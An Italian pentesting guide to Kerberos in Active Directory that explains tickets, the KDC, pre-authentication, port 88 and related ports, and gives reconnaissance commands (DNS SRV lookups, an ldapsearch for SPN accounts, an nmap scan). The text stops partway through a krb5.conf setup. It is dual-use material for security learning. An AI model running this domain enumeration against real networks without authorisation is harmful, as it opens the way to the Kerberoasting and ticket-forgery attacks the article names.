---
title: 'Kerberos: Cos''è, Autenticazione, Porta 88, Active Directory'
slug: kerberos
description: 'Come funziona Kerberos su Windows: KDC, ticket TGT e TGS, porta 88 TCP/UDP, Kerberos vs NTLM e LDAP. Configurazione, errori, sicurezza e attacchi con comandi'
image: /porta-88-kerberos-active-directory.webp
draft: false
date: 2026-03-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - kerberoasting
  - active directory
  - kerberos
  - golden ticket
  - port 88 kerberos
featured: true
---

# Kerberos in Active Directory: Come Funziona, Porta 88, KDC e Attacchi

Kerberos è il protocollo di autenticazione che gestisce ogni login, ogni accesso a una share di rete e ogni connessione a un servizio in [Active Directory](https://hackita.it/articoli/active-directory/), il sistema nervoso di ogni rete aziendale Windows. Il servizio Kerberos ascolta sulla **porta 88 TCP/UDP** del Domain Controller e, per un pentester, è un tesoro: permette di **enumerare utenti validi senza credenziali**, estrarre hash craccabili di service account (**[Kerberoasting](https://hackita.it/articoli/kerberoasting/)**) e di utenti senza pre-autenticazione (**[AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting/)**), forgiare ticket che danno accesso illimitato al dominio (**[Golden Ticket](https://hackita.it/articoli/golden-ticket/)**) e persistere indefinitamente nell'ambiente.

In questa guida trovi tutto in un unico posto: cos'è Kerberos e come funziona il protocollo di autenticazione, cosa fa il KDC, a cosa servono le porte 88, 464 e 749, la differenza tra Kerberos e NTLM e tra Kerberos e LDAP, come configurare e testare Kerberos su Linux, come leggere gli errori più comuni e, soprattutto, come attaccarlo e come difenderlo.

Non esagero dicendo che il 70% dei penetration test su Active Directory che ho fatto negli ultimi anni è passato per Kerberos. È il protocollo che gli admin non toccano mai ("funziona, non ci penso") e che i pentester conoscono meglio di loro.

Ricordo un engagement per una banca regionale: 3000 utenti AD, policy di password complessa (12 caratteri, maiuscole, numeri, speciali). Sembrava blindata. Poi ho fatto Kerberoasting e ho estratto 47 hash di service account. Il service account `svc_sqlprod` aveva password `SqlProd2019!`, conforme alla policy ma vecchia di 6 anni e mai cambiata. Con quell'account ho raggiunto il database di produzione con i dati di 180.000 clienti. La policy delle password non copriva i service account.

## Cos'è Kerberos e come funziona l'autenticazione Kerberos

Kerberos è un protocollo di autenticazione di rete basato su **ticket**. L'idea è semplice: invece di mandare la password a ogni servizio, ti autentichi **una sola volta** presso un'entità fidata e ricevi dei ticket che dimostrano chi sei. Il nome viene dal cane a tre teste che custodisce l'ingresso dell'Ade nella mitologia greca: le tre teste sono client, servizio e server di autenticazione.

La versione in uso oggi è la 5 (Kerberos v5, definita in RFC 4120), adottata da Microsoft in Active Directory fin da Windows 2000. Kerberos fornisce autenticazione **mutua**: non solo il server verifica te, ma anche tu verifichi il server. Questo lo rende molto più robusto di NTLM, ma non invulnerabile, come vedremo.

Il Domain Controller che gestisce tutto questo si chiama `Key Distribution Center`. Il significato è: centro di distribuzione delle chiavi, abbreviato KDC. Nel mondo Active Directory ogni Domain Controller è anche un KDC.

Il meccanismo usa due tipi di ticket:

* **[TGT](https://hackita.it/articoli/tgt/)** (`Ticket Granting Ticket`, tradotto: ticket per ottenere altri ticket). Lo ottieni dopo il login al KDC e dimostra che sei autenticato.
* **[TGS](https://hackita.it/articoli/tgs/)** (`Ticket Granting Service`, il ticket di servizio). Lo richiedi usando il TGT per accedere a un servizio specifico (SMB, SQL, HTTP). È il ticket che presenti al servizio per entrare.

![Kerberos authentication flow: AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ, AP-REP](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDU2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmb250LWZhbWlseT0iQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CiAgPGRlZnM+CiAgICA8bWFya2VyIGlkPSJhcnJvdyIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmZmZmZiIvPgogICAgPC9tYXJrZXI+CiAgICA8bWFya2VyIGlkPSJhcnJvd1JlZCIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2ZmMDEwMyIvPgogICAgPC9tYXJrZXI+CiAgPC9kZWZzPgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSI5MDAiIGhlaWdodD0iNTYwIiBmaWxsPSIjNmIwMDAxIi8+CiAgPHRleHQgeD0iNDUwIiB5PSIzMiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIyMCIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiI+S2VyYmVyb3MgYXV0aGVudGljYXRpb24gZmxvdzwvdGV4dD4KICA8cmVjdCB4PSI0MCIgeT0iNTUiIHdpZHRoPSIyMDAiIGhlaWdodD0iNjUiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjE0MCIgeT0iODMiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiPkNsaWVudDwvdGV4dD4KICA8dGV4dCB4PSIxNDAiIHk9IjEwNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+TXIuRGVlcDwvdGV4dD4KICA8cmVjdCB4PSIzNTAiIHk9IjU1IiB3aWR0aD0iMjAwIiBoZWlnaHQ9IjY1IiByeD0iOCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiLz4KICA8dGV4dCB4PSI0NTAiIHk9IjgzIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIj5LREM8L3RleHQ+CiAgPHRleHQgeD0iNDUwIiB5PSIxMDQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPkRvbWFpbiBDb250cm9sbGVyLCBwb3J0IDg4PC90ZXh0PgogIDxyZWN0IHg9IjY2MCIgeT0iNTUiIHdpZHRoPSIyMDAiIGhlaWdodD0iNjUiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9Ijc2MCIgeT0iODMiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiPlNlcnZpY2U8L3RleHQ+CiAgPHRleHQgeD0iNzYwIiB5PSIxMDQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPlNRTCBTZXJ2ZXI8L3RleHQ+CiAgPGxpbmUgeDE9IjE0MCIgeTE9IjEyMCIgeDI9IjE0MCIgeTI9IjQ5MCIgc3Ryb2tlPSIjZmZmZmZmIiBzdHJva2Utd2lkdGg9IjEiIHN0cm9rZS1kYXNoYXJyYXk9IjYsNCIvPgogIDxsaW5lIHgxPSI3NjAiIHkxPSIxMjAiIHgyPSI3NjAiIHkyPSI0OTAiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIxIiBzdHJva2UtZGFzaGFycmF5PSI2LDQiLz4KICA8cmVjdCB4PSIzODAiIHk9IjEzNSIgd2lkdGg9IjE0MCIgaGVpZ2h0PSIxMTAiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjQ1MCIgeT0iMTgyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE4IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmYwMTAzIj5BUzwvdGV4dD4KICA8dGV4dCB4PSI0NTAiIHk9IjIwNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMiIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+QXV0aGVudGljYXRpb24gU2VydmljZTwvdGV4dD4KICA8cmVjdCB4PSIzODAiIHk9IjI1NSIgd2lkdGg9IjE0MCIgaGVpZ2h0PSIxMTAiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjQ1MCIgeT0iMzAyIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE4IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmYwMTAzIj5UR1M8L3RleHQ+CiAgPHRleHQgeD0iNDUwIiB5PSIzMjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTIiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPlRpY2tldCBHcmFudGluZyBTZXJ2aWNlPC90ZXh0PgogIDx0ZXh0IHg9IjI2MCIgeT0iMTQ0IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIj4xLiBBUy1SRVE8L3RleHQ+CiAgPHRleHQgeD0iMjYwIiB5PSIxNjAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTEiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPkkgYW0gTXIuRGVlcCwgZW5jcnlwdGVkIHRpbWVzdGFtcDwvdGV4dD4KICA8bGluZSB4MT0iMTQwIiB5MT0iMTcwIiB4Mj0iMzc4IiB5Mj0iMTcwIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KICA8dGV4dCB4PSIyNjAiIHk9IjE5NCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyI+Mi4gQVMtUkVQPC90ZXh0PgogIDx0ZXh0IHg9IjI2MCIgeT0iMjEwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjExIiBmb250LXdlaWdodD0iNDAwIiBmaWxsPSIjZmZmZmZmIj5IZXJlIGlzIHlvdXIgVEdUIGFuZCBzZXNzaW9uIGtleTwvdGV4dD4KICA8bGluZSB4MT0iMzgwIiB5MT0iMjIwIiB4Mj0iMTQyIiB5Mj0iMjIwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvd1JlZCkiLz4KICA8dGV4dCB4PSIyNjAiIHk9IjI2NCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiI+My4gVEdTLVJFUTwvdGV4dD4KICA8dGV4dCB4PSIyNjAiIHk9IjI4MCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMSIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+TXkgVEdULCBJIHdhbnQgTVNTUUxTdmMvZGIwMTwvdGV4dD4KICA8bGluZSB4MT0iMTQwIiB5MT0iMjkwIiB4Mj0iMzc4IiB5Mj0iMjkwIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KICA8dGV4dCB4PSIyNjAiIHk9IjMxNCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyI+NC4gVEdTLVJFUDwvdGV4dD4KICA8dGV4dCB4PSIyNjAiIHk9IjMzMCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1zaXplPSIxMSIgZm9udC13ZWlnaHQ9IjQwMCIgZmlsbD0iI2ZmZmZmZiI+SGVyZSBpcyB5b3VyIHNlcnZpY2UgdGlja2V0PC90ZXh0PgogIDxsaW5lIHgxPSIzODAiIHkxPSIzNDAiIHgyPSIxNDIiIHkyPSIzNDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93UmVkKSIvPgogIDx0ZXh0IHg9IjYwNSIgeT0iMzg0IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIj41LiBBUC1SRVE8L3RleHQ+CiAgPHRleHQgeD0iNjA1IiB5PSI0MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTEiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPk1yLkRlZXAgcHJlc2VudHMgdGhlIHNlcnZpY2UgdGlja2V0PC90ZXh0PgogIDxsaW5lIHgxPSIxNDAiIHkxPSI0MTAiIHgyPSI3NTgiIHkyPSI0MTAiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93KSIvPgogIDx0ZXh0IHg9IjYwNSIgeT0iNDQ0IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmYwMTAzIj42LiBBUC1SRVA8L3RleHQ+CiAgPHRleHQgeD0iNjA1IiB5PSI0NjAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTEiIGZvbnQtd2VpZ2h0PSI0MDAiIGZpbGw9IiNmZmZmZmYiPkFjY2VzcyBncmFudGVkLCBtdXR1YWwgYXV0aGVudGljYXRpb248L3RleHQ+CiAgPGxpbmUgeDE9Ijc2MCIgeTE9IjQ3MCIgeDI9IjE0MiIgeTI9IjQ3MCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIi8+CiAgPHJlY3QgeD0iMTAwIiB5PSI1MDAiIHdpZHRoPSI3MDAiIGhlaWdodD0iNDQiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjQ1MCIgeT0iNTE5IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEyIiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5UaGUgVEdUIGlzIGVuY3J5cHRlZCB3aXRoIHRoZSBrcmJ0Z3Qga2V5PC90ZXh0PgogIDx0ZXh0IHg9IjQ1MCIgeT0iNTM1IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEyIiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5UaGUgc2VydmljZSB0aWNrZXQgaXMgZW5jcnlwdGVkIHdpdGggdGhlIHNlcnZpY2UgYWNjb3VudCBrZXk8L3RleHQ+Cjwvc3ZnPgo=)

I sei messaggi del diagramma hanno nomi precisi che ritroverai in Wireshark e nei log:

| Messaggio | Chi lo manda      | Cosa contiene                                 |
| --------- | ----------------- | --------------------------------------------- |
| AS-REQ    | Client → KDC      | Richiesta di TGT (con pre-autenticazione)     |
| AS-REP    | KDC → Client      | Il TGT e una chiave di sessione               |
| TGS-REQ   | Client → KDC      | Il TGT e il nome del servizio (SPN) richiesto |
| TGS-REP   | KDC → Client      | Il ticket di servizio (TGS)                   |
| AP-REQ    | Client → Servizio | Il TGS presentato al servizio                 |
| AP-REP    | Servizio → Client | Conferma (autenticazione mutua)               |

### Perché un attaccante ama Kerberos

Il TGT è cifrato con la chiave dell'account `krbtgt`. Il TGS è cifrato con la chiave dell'account del servizio. Tutti gli attacchi Kerberos nascono da qui: se riesci a mettere le mani su una di queste chiavi (o a craccarla offline), puoi forgiare o rubare ticket. Da qui nascono il [Golden Ticket](https://hackita.it/articoli/golden-ticket/) (forgi il TGT con la chiave di `krbtgt`), il [Silver Ticket](https://hackita.it/articoli/silver-ticket/) (forgi il TGS con la chiave del servizio) e le varianti più discrete, il [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/) e il [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/), che partono da ticket reali invece di costruirli da zero.

## Ticket Kerberos: differenza tra TGT e ticket di servizio (TGS)

In Kerberos esistono due tipi di ticket e confonderli è l'errore più comune di chi inizia. Il primo ti identifica presso il KDC, il secondo ti fa entrare in un servizio.

### Il TGT: il ticket che ti identifica

Il [TGT](https://hackita.it/articoli/tgt/) (`Ticket Granting Ticket`, tradotto: ticket per ottenere altri ticket) lo ricevi nell'AS-REP dopo aver dimostrato di conoscere la password. È cifrato con la chiave dell'account `krbtgt`, quindi **tu non puoi leggerlo**: lo custodisci e lo ripresenti al KDC ogni volta che ti serve un nuovo ticket. Contiene la tua identità, i gruppi di cui fai parte (dentro il PAC, il `Privilege Attribute Certificate`, tradotto: certificato degli attributi di privilegio) e la scadenza. In Active Directory vale 10 ore di default e si può rinnovare per un massimo di 7 giorni.

Con un TGT valido non reinserisci più la password: è il motivo per cui Kerberos permette il Single Sign-On, ed è anche il motivo per cui rubare un TGT è così potente.

### Il ticket di servizio (TGS)

Il [TGS](https://hackita.it/articoli/tgs/) è il ticket che presenti a un singolo servizio (SMB, HTTP, MSSQL). Lo richiedi al KDC con un TGS-REQ, usando il TGT e indicando il nome del servizio (SPN). È cifrato con la chiave dell'account che possiede quell'SPN.

Un dettaglio che spiega mezzo capitolo di attacchi: il KDC **non controlla se hai il permesso** di usare quel servizio, ti rilascia il ticket e basta. L'autorizzazione la decide il servizio leggendo il PAC. Per questo qualsiasi utente del dominio può richiedere il ticket di qualsiasi servizio, ed è la base del Kerberoasting.

|                   | TGT                              | Ticket di servizio (TGS)         |
| ----------------- | -------------------------------- | -------------------------------- |
| Emesso da         | AS (risposta AS-REP)             | TGS (risposta TGS-REP)           |
| Cifrato con       | Chiave di `krbtgt`               | Chiave dell'account del servizio |
| Lo presenti a     | KDC                              | Servizio                         |
| Contiene          | Identità, gruppi (PAC), scadenza | Identità, gruppi (PAC), scadenza |
| Attacco collegato | Golden Ticket                    | Kerberoasting, Silver Ticket     |

Per vedere i due tipi nella cache del tuo sistema basta `klist`:

```bash
# Show the TGT and every service ticket in the credential cache
klist
```

```text
Valid starting     Expires            Service principal
11/06/26 19:00:01  11/07/26 05:00:01  krbtgt/CORP.LOCAL@CORP.LOCAL
11/06/26 19:02:10  11/07/26 05:00:01  cifs/dc01.corp.local@CORP.LOCAL
```

La prima riga è il TGT, la seconda è un ticket di servizio per SMB (`cifs`).

## Kerberos KDC: cosa fa e dove si trova

Il KDC è composto da due servizi logici che girano sullo stesso Domain Controller:

* **AS** (Authentication Service): verifica chi sei e ti rilascia il TGT.
* **TGS** (Ticket Granting Service): rilascia i ticket per i singoli servizi.

Il KDC conosce la chiave di ogni utente e di ogni servizio del dominio, ed è per questo che la compromissione dell'hash di `krbtgt` equivale alla compromissione totale del dominio (Golden Ticket).

Per trovare i KDC di un dominio non serve nessuna credenziale, basta il DNS:

```bash
# List the domain controllers advertising Kerberos
nslookup -type=SRV _kerberos._tcp.corp.local 10.10.10.10
dig @10.10.10.10 SRV _kerberos._tcp.corp.local +short
dig @10.10.10.10 SRV _kerberos._udp.corp.local +short
dig @10.10.10.10 SRV _kpasswd._tcp.corp.local +short
```

```text
0 100 88 dc01.corp.local.
```

Il record SRV ti dice host e porta del KDC. Se il [DNS](https://hackita.it/articoli/dns/) del dominio risponde, hai trovato il Domain Controller senza toccare nessun servizio.

## Kerberos pre-authentication: perché esiste e cosa succede se la togli

Quando un client chiede un TGT, nell'AS-REQ include un **timestamp cifrato con la chiave derivata dalla sua password**. Il KDC lo decifra: se funziona, la password è giusta e rilascia il TGT. Questa è la pre-autenticazione (`PA-ENC-TIMESTAMP`).

Senza pre-autenticazione il KDC risponde a **chiunque** con un AS-REP, e una parte di quella risposta è cifrata con la chiave dell'utente. Un attaccante può portarsela a casa e craccarla offline: è esattamente l'[AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting/), che vediamo più avanti.

La pre-autenticazione è attiva di default su ogni account. Esiste un flag, `Do not require Kerberos preauthentication` (`DONT_REQUIRE_PREAUTH`), che l'amministratore può abilitare per compatibilità con software vecchio. Ogni utente con quel flag è un bersaglio.

La pre-autenticazione serve anche a bloccare gli attacchi di replay: il timestamp ha una validità breve. Per questo Kerberos richiede che gli orologi di client e KDC siano allineati entro **5 minuti** (tolleranza di default). Se non lo sono, ottieni l'errore `KRB_AP_ERR_SKEW`, che vedremo nel troubleshooting.

## Porta Kerberos 88 e le altre porte: 88, 464, 749, TCP e UDP

La domanda classica è "quale porta usa Kerberos?". La risposta breve: **88**. Ma ci sono altre porte legate al mondo Kerberos che vanno distinte.

| Porta   | Protocollo | Servizio                             | Dove lo trovi                   |
| ------- | ---------- | ------------------------------------ | ------------------------------- |
| **88**  | TCP/UDP    | KDC: AS-REQ, TGS-REQ                 | Active Directory e MIT Kerberos |
| **464** | TCP/UDP    | `kpasswd`: cambio password           | Active Directory e MIT Kerberos |
| **749** | TCP        | `kadmind`: amministrazione del realm | Solo MIT Kerberos               |
| **750** | UDP        | Kerberos IV (storico)                | Installazioni vecchie           |

Qualche precisazione utile:

* **88 TCP o UDP?** Entrambi. Il client prova prima UDP per i messaggi piccoli. Se il ticket è troppo grande per un datagramma (succede spesso con utenti in tanti gruppi, perché il PAC cresce), il KDC risponde con `KRB_ERR_RESPONSE_TOO_BIG` e il client riprova su TCP. Se il tuo firewall blocca UDP 88 o TCP 88, Kerberos funziona a metà e i problemi sono intermittenti.
* **464** non autentica nulla: serve solo a cambiare la password dell'utente. Su Active Directory è sempre aperta sui DC.
* **749** esiste solo nelle installazioni MIT Kerberos (tipico di Linux/Unix) e serve agli amministratori per gestire principal e policy con `kadmin` (dettagli su [kadmin e kpasswd](https://hackita.it/articoli/porta-880-kerberos-admin/)). Un `kadmind` esposto è una superficie d'attacco in più.
* **389 e 445 non sono porte Kerberos.** La 389 è [LDAP](https://hackita.it/articoli/porta-389-ldap/), la 445 è [SMB](https://hackita.it/articoli/smb/). Sono sempre aperte accanto alla 88 su un Domain Controller, ma sono servizi diversi.

Su un Domain Controller Windows ti troverai quindi questo quadro:

| Porta                                              | Servizio     | Funzione                              |
| -------------------------------------------------- | ------------ | ------------------------------------- |
| **88**                                             | Kerberos KDC | Autenticazione e distribuzione ticket |
| **464**                                            | kpasswd      | Cambio password Kerberos              |
| [389](https://hackita.it/articoli/porta-389-ldap/) | LDAP         | Directory Active Directory            |
| [445](https://hackita.it/articoli/smb/)            | SMB          | File sharing, RPC                     |
| [53](https://hackita.it/articoli/dns/)             | DNS          | Risoluzione nomi e record SRV del KDC |

## Kerberos in Windows e Active Directory

In un dominio Windows, Kerberos è il protocollo di autenticazione **predefinito**. Ogni login interattivo, ogni accesso a una share, ogni connessione RDP o WinRM tra macchine del dominio passa da Kerberos, a meno che qualcosa lo costringa a ripiegare su NTLM.

Per far funzionare tutto questo servono tre ingredienti:

* Un **realm**: in Active Directory coincide con il nome del dominio in maiuscolo (`CORP.LOCAL`).
* Nomi DNS corretti: Kerberos lavora con nomi, non con indirizzi IP.
* Gli **SPN** (`Service Principal Name`, tradotto: nome principale del servizio), cioè le etichette che collegano un servizio a un account. Hanno la forma `servizio/host:porta`, per esempio `MSSQLSvc/db01.corp.local:1433` o `HTTP/web01.corp.local`.

Gli SPN sono il cuore del Kerberoasting: chi richiede un TGS per un SPN riceve un ticket cifrato con la password dell'account che possiede quell'SPN. Per elencarli:

```bash
# List accounts with an SPN using LDAP (any authenticated user can do it)
ldapsearch -x -H ldap://10.10.10.10 -D 'j.rossi@corp.local' -w 'Password1' -b 'DC=corp,DC=local' '(&(samAccountType=805306368)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
```

```text
# From a Windows host
setspn -T corp.local -Q */*
setspn -L svc_sql
```

### Dove si usa Kerberos oltre ad Active Directory

Kerberos non è solo Windows. Lo trovi in:

* **MIT Kerberos**: l'implementazione di riferimento, usata su Linux e Unix per SSH con GSSAPI, NFS, e ambienti dove il realm non è Active Directory.
* **Hadoop e big data**: i cluster protetti usano Kerberos per autenticare utenti e servizi.
* **Single Sign-On web**: SPNEGO permette ai browser di autenticarsi con il ticket Kerberos verso siti interni.

La differenza pratica per un pentester: su Active Directory trovi il servizio come `Microsoft Windows Kerberos` in Nmap, su un KDC MIT trovi la stessa porta 88 ma con porte 464 e 749 e senza LDAP/SMB di Windows accanto.

### MIT Kerberos: cos'è e differenze con Active Directory

MIT Kerberos è l'implementazione open source di riferimento, sviluppata al Massachusetts Institute of Technology. Gira su Linux e Unix con i servizi `krb5kdc` (il KDC) e `kadmind` (l'amministrazione), configurati in `/etc/krb5.conf` e `/etc/krb5kdc/kdc.conf`. Esiste anche un client per Windows, `MIT Kerberos for Windows`, tradotto: Kerberos del MIT per Windows, usato per ottenere ticket da un realm non Microsoft.

La differenza con Active Directory è nell'ecosistema: su AD il KDC vive dentro il Domain Controller, insieme a LDAP, DNS e Group Policy, e i gruppi viaggiano nel PAC. Su MIT Kerberos il KDC è un servizio autonomo con un suo database di principal, gestito con `kadmin`. I due mondi possono fidarsi tra loro con una cross-realm trust.

Per riconoscerlo in un pentest controlla le tre porte insieme:

```bash
# Scan the Kerberos ports: KDC, password change, MIT admin server
nmap -sV -p 88,464,749 10.10.10.10
```

Se vedi la 749 aperta e Nmap non riporta `Microsoft Windows Kerberos`, hai davanti un KDC MIT.

## Kerberos vs NTLM: le differenze che contano in un pentest

Kerberos e [NTLM](https://hackita.it/articoli/ntlm/) fanno lo stesso mestiere (autenticare) in modo molto diverso.

|                            | Kerberos                                             | NTLM                                                                                                          |
| -------------------------- | ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| Modello                    | Ticket rilasciati dal KDC                            | Challenge-response                                                                                            |
| Autenticazione mutua       | Sì                                                   | No                                                                                                            |
| Serve il DC a ogni accesso | No, basta il ticket                                  | Sì, il server passa la verifica al DC                                                                         |
| Funziona con IP            | No, serve il nome                                    | Sì                                                                                                            |
| Dipende dall'orologio      | Sì (5 minuti)                                        | No                                                                                                            |
| Attacchi tipici            | Kerberoasting, AS-REP Roasting, Golden/Silver Ticket | [Relay](https://hackita.it/articoli/ntlm-relay/), [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/) |

Il punto operativo: **se ti connetti a una macchina usando l'indirizzo IP invece del nome, Windows ripiega su NTLM**. Per questo i tool che girano con `-k` (Kerberos) vogliono il nome DNS e non l'IP. E per questo, in un ambiente dove NTLM è ancora abilitato, gli attacchi di relay con [Responder](https://hackita.it/articoli/responder/) funzionano anche se "tutto usa Kerberos".

Regola pratica: Kerberos è più sicuro come protocollo, ma NTLM resta nel dominio per retrocompatibilità, e la sicurezza di un sistema è quella del suo anello più debole.

## Kerberos vs LDAP: non sono alternative

Confrontarli è comune ma fuorviante, perché fanno cose diverse:

* **Kerberos** autentica: dimostra chi sei.
* **LDAP** è un protocollo per interrogare e modificare la directory (utenti, gruppi, computer, SPN).

In Active Directory lavorano insieme: un client si autentica con Kerberos e poi usa LDAP per interrogare la directory, tipicamente con un `bind` SASL/GSSAPI che riusa il ticket. Se LDAP accetta bind semplici in chiaro o anonimi, il problema non è Kerberos, è la configurazione di LDAP.

Una nota rapida anche su SAML: SAML è usato per il Single Sign-On tra organizzazioni e applicazioni web, mentre Kerberos vive dentro la rete interna. Non si sostituiscono, si complementano.

## Configurare e testare l'autenticazione Kerberos su Linux

Per usare Kerberos dalla tua macchina d'attacco, per esempio [Kali Linux](https://hackita.it/articoli/kali-linux/), serve un file `krb5.conf` che dice dove sta il KDC. Prima di tutto, sincronizza l'orologio col Domain Controller, altrimenti ogni richiesta fallisce con `KRB_AP_ERR_SKEW`:

```bash
# Align the local clock with the domain controller (5 minutes max skew)
sudo ntpdate 10.10.10.10
```

Poi crea la configurazione:

```bash
sudo tee /etc/krb5.conf > /dev/null << 'EOF'
[libdefaults]
    default_realm = CORP.LOCAL
